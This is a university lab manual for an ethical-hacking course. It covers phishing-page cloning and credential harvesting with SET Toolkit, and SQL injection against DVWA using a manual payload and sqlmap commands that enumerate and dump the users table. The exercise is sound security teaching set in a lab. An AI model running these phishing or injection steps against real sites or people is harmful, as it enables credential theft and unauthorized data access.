# Experiment 7
# Social Engineering using SET Toolkit and SQL Injection Detection using DVWA & SQLMap

## Aim

To understand social engineering attacks using the Social-Engineer Toolkit (SET) and detect SQL Injection vulnerabilities in a deliberately vulnerable web application using SQLMap.

---

## Course Outcome Mapping

**CO3:** Prioritize vulnerabilities by severity and apply techniques for securing systems against unauthorized access.

---

## Prerequisites

Students should be familiar with:

- HTTP Request and Response
- HTML Forms
- SQL Basics
- Web Browsers
- Kali Linux
- Basic Linux Commands

---

# Theory

Cyber attacks often target both people and technology.

Social Engineering exploits human psychology to obtain confidential information, while SQL Injection exploits insecure database queries in web applications.

This experiment demonstrates both attacks in a safe laboratory environment using intentionally vulnerable systems.

---

# Practical Scenario

You are working as an Ethical Hacker hired to assess an organization's security awareness and web application security.

Your objectives are:

- Demonstrate a phishing page using SET Toolkit.
- Detect SQL Injection vulnerabilities in DVWA.
- Generate findings and recommend mitigation strategies.

All activities must be performed only in the instructor-provided laboratory environment.

---

# Software Requirements

| Tool | Purpose |
|------|---------|
| Kali Linux | Operating System |
| SET Toolkit | Social Engineering |
| DVWA | Vulnerable Web Application |
| SQLMap | SQL Injection Detection |
| Firefox / Chrome | Browser |
| VirtualBox / VMware | Virtualization |

---

# Part A – Social Engineering using SET Toolkit

## Activity 1 – Start SET Toolkit

Open Terminal.

Execute:

```bash
sudo setoolkit
```

---

## Activity 2 – Select Social Engineering Attack

Navigate through the menu.

```
1) Social Engineering Attacks

↓

2) Website Attack Vectors

↓

3) Credential Harvester Attack Method
```

Observe the available attack options.

---

## Activity 3 – Clone a Demonstration Website

Select:

```
Site Cloner
```

Provide the URL supplied by the instructor.

Example:

```
http://example.com
```

Record the generated IP address.

---

## Activity 4 – Demonstrate Credential Harvesting

Open another browser.

Access the cloned page.

Enter sample credentials provided by the instructor.

Observe how SET captures the entered information.

**Note:** Use only dummy credentials provided for laboratory purposes.

---

## Activity 5 – Analyze the Results

Record:

| Parameter | Observation |
|-----------|-------------|
| Target Website | |
| Captured Username | |
| Captured Password | |
| Attack Successful | Yes / No |

---

# Part B – SQL Injection Detection

## Activity 6 – Start DVWA

Open DVWA.

Login using instructor-provided credentials.

Set Security Level to:

```
Low
```

---

## Activity 7 – Verify SQL Injection Page

Navigate to:

```
DVWA

↓

SQL Injection
```

Observe the application.

---

## Activity 8 – Manual SQL Injection

Enter the following payload.

```sql
' OR '1'='1
```

Observe the output.

Record your observations.

---

## Activity 9 – Start SQLMap

Open Terminal.

Execute:

```bash
sqlmap -u "http://<target>/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"
```

---

## Activity 10 – Enumerate Databases

Execute:

```bash
sqlmap -u "<URL>" --dbs
```

Record the databases identified.

---

## Activity 11 – Enumerate Tables

Execute:

```bash
sqlmap -u "<URL>" -D dvwa --tables
```

Record the available tables.

---

## Activity 12 – Enumerate Columns

Execute:

```bash
sqlmap -u "<URL>" -D dvwa -T users --columns
```

Record the column names.

---

## Activity 13 – Dump Data (Instructor Demonstration)

Execute:

```bash
sqlmap -u "<URL>" -D dvwa -T users --dump
```

Observe the retrieved records.

---

# Investigation Challenges

### Challenge 1

What is Social Engineering?

Answer:

_________________________

---

### Challenge 2

What information was captured using SET Toolkit?

Answer:

_________________________

---

### Challenge 3

Why are phishing attacks successful?

_____________________________________________________

---

### Challenge 4

What is SQL Injection?

_____________________________________________________

---

### Challenge 5

Which SQLMap option lists available databases?

Answer:

_________________________

---

### Challenge 6

What is the purpose of the `--tables` option?

_____________________________________________________

---

### Challenge 7

Why should DVWA be used only in a laboratory environment?

_____________________________________________________

---

### Challenge 8

Mention three countermeasures against SQL Injection.

1.

2.

3.

---

### Challenge 9

Mention three defenses against phishing attacks.

1.

2.

3.

---

### Challenge 10

Differentiate Social Engineering and SQL Injection.

_____________________________________________________

---

# Observation Table

| Activity | Observation |
|-----------|-------------|
| Website Cloned | |
| Credentials Captured | |
| SQL Payload Tested | |
| SQLMap Used | |
| Databases Found | |
| Tables Found | |
| SQL Injection Successful | |

---

# Sample Security Assessment Report

| Parameter | Observation |
|------------|-------------|
| Analyst | |
| Date | |
| Tool Used | |
| Vulnerability Identified | |
| Severity | |
| Recommendation | |

---

# Result

Successfully demonstrated a social engineering attack using SET Toolkit and detected SQL Injection vulnerabilities using DVWA and SQLMap in a controlled laboratory environment. The identified security weaknesses were documented along with appropriate mitigation recommendations.

---

# Precautions

- Use only instructor-provided virtual machines.
- Never host phishing pages on public networks.
- Never target real websites or production systems.
- Use only dummy credentials.
- Perform SQL Injection only on intentionally vulnerable applications such as DVWA.
- Follow institutional ethical hacking policies.

---

# Viva Questions

1. What is Social Engineering?
2. What is SET Toolkit?
3. What is Credential Harvesting?
4. What is SQL Injection?
5. What is SQLMap?
6. What is DVWA?
7. Differentiate Manual SQL Injection and SQLMap.
8. Why should parameterized queries be used?
9. Mention two defenses against phishing attacks.
10. Why should penetration testing always require authorization?

---

# Conclusion

This experiment demonstrated how attackers exploit both human behavior and vulnerable web applications. Students learned to perform social engineering awareness exercises using the SET Toolkit and detect SQL Injection vulnerabilities using SQLMap against DVWA. The experiment emphasized ethical testing practices, vulnerability reporting, and secure coding recommendations.